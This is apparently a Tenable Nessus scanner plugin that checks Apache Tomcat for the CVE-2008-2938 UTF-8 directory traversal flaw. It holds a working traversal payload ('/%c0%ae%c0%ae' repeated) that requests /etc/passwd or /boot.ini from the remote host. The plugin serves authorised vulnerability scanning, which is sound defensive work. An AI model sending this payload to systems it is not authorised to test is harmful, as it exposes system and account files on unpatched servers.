#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(33866);
  script_version("1.28");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_cve_id("CVE-2008-2938");
  script_bugtraq_id(30633);

  script_name(english:"Apache Tomcat allowLinking UTF-8 Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Apache Tomcat running on the remote host is affected by
a directory traversal vulnerability due to an issue with the UTF-8
charset implementation within the underlying JVM. An unauthenticated,
remote attacker can exploit this, by encoding directory traversal
sequences as UTF-8 in a request, to view arbitrary files on the remote
host. 

Note that successful exploitation requires that a context be
configured with 'allowLinking' set to 'true' and the connector with
'URIEncoding' set to 'UTF-8', neither of which is a default setting.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/495318/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/496168/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/499356/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://tomcat.apache.org/security-6.html");
  script_set_attribute(attribute:"see_also", value:"http://tomcat.apache.org/security-5.html");
  script_set_attribute(attribute:"see_also", value:"http://tomcat.apache.org/security-4.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to Tomcat 6.0.18 / 5.5.27 / 4.1.SVN or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache Tomcat File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  script_cwe_id(22);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/08/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/08/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:tomcat");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("tomcat_error_version.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 8080);
  script_require_keys("installed_sw/Apache Tomcat");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("audit.inc");
include("install_func.inc");
include("data_protection.inc");

get_install_count(app_name:"Apache Tomcat", exit_if_zero:TRUE);
port = get_http_port(default:8080);
install = get_single_install(app_name:"Apache Tomcat", port:port);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (!os) files = make_list("/boot.ini", "/etc/passwd");
else
{
  if ("Windows" >< os) files = make_list("/boot.ini");
  else files = make_list("/etc/passwd");
}

foreach file (files)
{
  traversal = "/%c0%ae%c0%ae";
  url = string(crap(data:traversal, length:strlen(traversal)*12), file);

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if looks like the file.
  if (
    ("boot.ini" >< file && "[boot loader]" >< res) ||
    ("/etc/passwd" >< file && pgrep(pattern:"root:.*:0:[01]:", string:res))
  )
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to retrieve the contents of '", file, "' on the\n",
        "remote host by sending the following request :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        res = data_protection::redact_etc_passwd(output:res);
        report = string(
          report,
          "\n",
          "Here are the contents :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string:res), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}

audit(AUDIT_LISTEN_NOT_VULN, "Apache Tomcat", port, install["version"]);
